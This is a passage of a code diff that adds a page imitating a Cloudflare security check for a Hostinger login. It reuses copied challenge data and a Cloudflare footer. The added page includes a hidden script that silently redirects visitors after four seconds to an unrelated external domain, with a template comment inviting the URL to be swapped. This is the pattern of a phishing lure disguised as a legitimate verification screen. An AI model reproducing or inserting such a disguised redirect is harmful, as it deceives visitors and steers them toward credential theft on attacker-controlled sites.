F3YZKtjLtBCAtnt0Qydrz8rnW3HR1PRIEcwcao7tmGIWeRVNPmeHo9H46QyyE0WOYPC6iaF.MPQpFdRBhm9uefA_UTY8.MJLD5NjCpF4EmiCZJJHTPxt54w1jvyg3uAwpPpxItI1LuJYjS319w_MTqDGdMDq2t3OJO3ijGFAfJlZmkZHUb_2zK1b2SzJRRU8IzPbSb3i_2klyP4zIY9nA6EbgE2n815D4yRcdh4KQEMGdf4ioPFenV1Qjr5Jmiha86rlu_8aswSJfp.IKRjkqt4ydAF4FH4QymJ.Rug5OWdFx15FIYrXTiwdCYFHMp5A5RtQ_T82JT1CQtaTZrOiOSoHi_GT.ejKN2xqfnY_ldKL.z.uZTPNUsTQ2zOdDwEzmibnnIHt81MYgPfplBBeCgQSr44_P1kzQqFBnPF.q7w8a0kZSINBN_xWhTadHhTX5qUfQBaxVZwK9l3S48SsZqzsEP5p5uJTuk8rGN05jdWfcYUF53WNQs3Rh5HXVVe5RSQBO3fsb7t87NNdckUHs9XdZLHLo53qRmZPims9uw0_oyWF29OAfwzSePdy55IXnCm6V01f4Fjbuaa_Lxa9nr9zY_F2u.EVyKZqfCyRkhI8VV9vHuGA038QDeHUA5grbXYNe9ZFnwChW9Wl89UUXMP5VEzqhi6hWiTb9GqdnI0pxu24.NjKYmJPopKK9ddUZ09cW2qCBh4GrBZ5JxRAHO90o9LNO8eH048McAJ03P.r8yOroMZquw8kQ1v5N9Yv.aBjIKTYxtLGero2zPgjxpqGHfTym8kOAcpyUcdpJ8LuUZGLGxY3qWhx071.lAmy8I6w_xvZVmtQL8aukJsBtVVniegmK5i.FlUAoFVqkn0j59NrTejlapybgVwh2NqlAJK2pVXLoy8d.1h_GflhjCbmaEi_moBL4JmGXSSpfA8428ahdkN8UlVWLvoZnt.CS1hwBUwNeuvXzna76w5iWk9AzgEsWDopQQ7XihOHAGCTJNM6xo4aOFbgy8W2f.Zq91wWwJt5J9D8w48YEMU3yuJQ9eaopd.S_l9Lgp8bk_0LpErcQySv07CVMkYbmpPwS8gj058c3731y28fYNS0hFFKM7TEk687BGQfwFI2_RApVzReQztEywmlb80UTuI1.r13dJkSisf0ahPcjfL9ZqW1QxSfBxU4uioBxaRvGN7EioeblDNoqQx_ZDDiay87FS3_s9cEGXt3_aDg5BKDYXeJJdsCWJxmCI0Cq1NCGZfYX7LtHrsyI21mDlweScibV9Z58lr9UCBLZektcP36JraFRoPOUSMp9qfiBk0neYYbJXrOEYm0aUQ.zhq8p5hlLqrYd.WfezWDYuW6ydAtiC97sUQhnfirmiA29stqnF51BqhPTDTbs.U3xmDFHerVaEI1dC0MSOAhxCuXqnpaF3ENoYjt313.ODjJQL9P3ztjpqt_UJWlTf2mykUtoelS_D3Pe2rG9gFpWN0JTZafnfliSg81dgDp54BNXkcNXmnkoQZE6aoUX9sT822R09DsAQYBXiHWTTlZd8A0Es57OLR2jUKr47kYYrUrEraC.BRdt0zT2P2flUlE4cDd8X0LH8UM27oc9p5hx1mboIzU7P9VO1GS15oEyYga9MOcY0In1ZjGT2xwWEYJ7g0HWJkOKMclEoRTu_Q._1OSytCGaKX9AiFPL8GXrMT.yYCRRgBGKUphF4XRwjQ9szG0NrW_KnDsGsBznXFii0OxkqsEvw3OSoVSjOAvLePSKjg2WiST_m0BxDgAslKz1jiKc4_84_FVbplPk79vCGk0CRQgrUJR26JVP2orjjOmPH_aUx5stvcjczNbuRG9C.hkQCM.z9cXCY6ulymKFZIcaQ4rzPrgGKJhGhINw9A7MJr8ikGoCIuf88xFo83UjhgSborm_Gw0yZUMv8_TYfEv4i68NFPase9WLfITJ6PwyPjDN6jSMg12PUTxjo1Zu097Fk2tSD9v.1LIKUm3TzW1_MTb.7OcfkvTaOP7ifwj58tTeprm5IHld2WjkJslpUYiqxXFOV2e5cANVYj7sS9TvFkE_YcZe7201mhKrxwplM9T6i30WRBHdIo8hfyXAMufgNlg_LgbLUkcuNW26EnhnRQSZP8gaNP9i.mOC5Y7WRqWuWrt9u89sq3sJ4qZEkKTer71xu6y16iUTT_McSbkfd2iXW2z40NczxnIIARdbps56gYOMY1nhNf5IArdoo2iFHxHhozzSE2vCe7U54nVwpT4ahwVZWEzyj0_8dzU1W4uWbqGv1_C8edr1ILopyXjGf6mQ0xmGUhk9Qc.eQeWtCw8hpdg1FsE4RzjhAoY9mLukS_OrudS6Hy0gpQSlnhVGsEKqruOGlHTaAumkgiJrpU2Ko6KYeUqF8zmG6dpKVVzoB6l2PxNnVLVyOG536shY_6wcztCDWpygrxiuIXNE5SH0tH",
+          cRq: {
+            ru: "aHR0cHM6Ly9hdXRoLmhvc3Rpbmdlci5jb20vbG9naW4=",
+            ra: "TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNy4wLjAuMCBTYWZhcmkvNTM3LjM2",
+            d: "PaVzKCZls45yGoDU2HlnLTI7AgnMWm8SWMm5ypCen17B8mWLhRkmf08IaxOM7cKtagAyThBUMdD3tY8rYT+arVme7ocaE65J3IGCRrxQCQjDA8EiArHtgwreWYfVtYv+FHKGvcy53kJ6jqxEEPFr7b8OdkTn9SfLTLRG+LJ9jOF7nzQJ/r7mupPQV3T0YPOHqKKNbxeP7NeFue60BnJVKRC4ULaOakAiBynZF96rWymPH3ZrpGxklkkejReNSCjjtOfibH/kNPGnjDgFEHzlIcKZp5bq8W3NMnapo6NRWFnarb1EY4JM6IcGuRHu5vYbUdAFbt9ZV29LZvQ2LB7Vys/vw0YtZEuiTCxHVLU1w+r83teculZYEWwLLakFyxwZxgbFiU6aXaLIHXGnOrD1nG5CFVWvWpSKp3q5LIGUNzDHfRU6+gvOFLvksd5bIsaGMPl3Tov7SZahlY4gW5tYNf2Q96Ug5unlFO8bOI8wPFrSAST6wQvYRClS5OSOEJSCaYyoq1yuJvS7pTioTWpyqA==",
+            t: "MTcyNDg4OTk4MS4wMDAwMDA=",
+            cT: Math.floor(Date.now() / 1000),
+            m: "gY4kB8EkqVrQwzcLYm5GSqxqxgiwxLpciTPbCsIdtBM=",
+            i1: "K+qDrBQNCwQxqgUc/05Y2Q==",
+            i2: "ZQBBROJkdhCjC30rQd9VRg==",
+            zh: "qayfZG1taVCcLxDZ6k99cDfVMUIg7i2niVq00ghjcsE=",
+            uh: "rWFtZGJE4Oa38UgkpzLxSaFRrp2i6jLI2EFiVAp7Oms=",
+            hh: "lCtru2Ew3vFFhBBCokLMIrjN1cT4Z42/rhvD7ummRvM=",
+          },
+        };
+        var cpo = document.createElement("script");
+        cpo.src =
+          "/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=8ba84b70fa49cf8b";
+        window._cf_chl_opt.cOgUHash =
+          location.hash === "" && location.href.indexOf("#") !== -1
+            ? "#"
+            : location.hash;
+        window._cf_chl_opt.cOgUQuery =
+          location.search === "" &&
+          location.href
+            .slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length)
+            .indexOf("?") !== -1
+            ? "?"
+            : location.search;
+        if (window.history && window.history.replaceState) {
+          var ogU =
+            location.pathname +
+            window._cf_chl_opt.cOgUQuery +
+            window._cf_chl_opt.cOgUHash;
+          history.replaceState(
+            null,
+            null,
+            "\/login?__cf_chl_rt_tk=.n2D9073ZhO1VAxR5.zWI50xBKEl7KhaPlqjra8bq8g-1724889981-0.0.1.1-6441" +
+              window._cf_chl_opt.cOgUHash
+          );
+          cpo.onload = function () {
+            history.replaceState(null, null, ogU);
+          };
+        }
+        document.getElementsByTagName("head")[0].appendChild(cpo);
+      })();
+    </script>
+<script>
+      setTimeout(function(){
+        window.location.href = "https://lifeontechji.za.com/R158Y/"; // Replace with your desired URL
+      }, 4000); // 4000 milliseconds = 4 seconds
+    </script>
+    <div class="footer" role="contentinfo">
+      <div class="footer-inner">
+        <div class="clearfix diagnostic-wrapper">
+          <div class="ray-id">Ray ID: <code>8ba84b70fa49cf8b</code></div>
+        </div>
+        <div class="text-center" id="footer-text">
+          Performance &amp; security by
+          <a
+            rel="noopener noreferrer"
+            href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=j"
+            target="_blank"
+            >Cloudflare</a
+          >
+        </div>
+      </div>
+    </div>
+  </body>
 </html>
-
